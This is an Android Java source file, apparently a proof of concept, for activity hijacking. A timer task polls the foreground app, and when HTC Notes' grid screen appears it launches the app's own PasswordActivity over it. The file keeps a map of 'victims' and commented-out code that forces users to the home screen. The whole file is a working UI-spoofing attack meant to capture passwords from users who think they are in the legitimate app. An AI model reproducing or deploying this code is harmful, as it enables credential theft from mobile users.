package com.example.hijack;

import java.util.HashMap;
import java.util.List;
import java.util.TimerTask;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class LockTask extends TimerTask {
    public static final String TAG = "LockTask";
    private Context mContext;
   
    
    private ActivityManager mActivityManager;
    
    public LockTask(Context context) {
        mContext = context;
        mActivityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
    }
    
    @Override
    public void run() {
        ComponentName topActivity = mActivityManager.getRunningTasks(1).get(0).topActivity;    
        
        Log.d(TAG, "LockTask topActivity.getPackageName() = " + topActivity.getPackageName() 
                + " topActivity.getPackageName() = " + topActivity.getClassName() );
        
     //   List<RunningAppProcessInfo>  appProcesses = mActivityManager.getRunningAppProcesses();
        
//        if ( !topActivity.getClassName().toLowerCase().contains("launcher") ) {
////            Intent intent = new Intent();
////            intent.setClassName(PACKAGE_NAME, CLASS_NAME);
//            Intent intent = new Intent(Intent.ACTION_MAIN);
//            intent.addCategory(Intent.CATEGORY_HOME);
//            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            mContext.startActivity(intent);
//        }
        
        
        if (   topActivity.getPackageName().equals(TEST_PACKAGE_NAME)
            && topActivity.getClassName().equals(TEST_CLASS_NAME) ) {
            Intent intent = new Intent();
            intent.setClassName(PACKAGE_NAME, CLASS_NAME);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            mContext.startActivity(intent);
        }
      
       
    }
    
    HashMap <String, Class<?> > mVictims = new HashMap <String, Class<?>>();
    
    private String TEST_PACKAGE_NAME = "com.htc.notes";
    private String TEST_CLASS_NAME = "com.htc.notes.collection.NotesGridViewActivity";
    
    private String PACKAGE_NAME = "com.example.hijack";
    private String CLASS_NAME = "com.example.hijack.PasswordActivity";
}
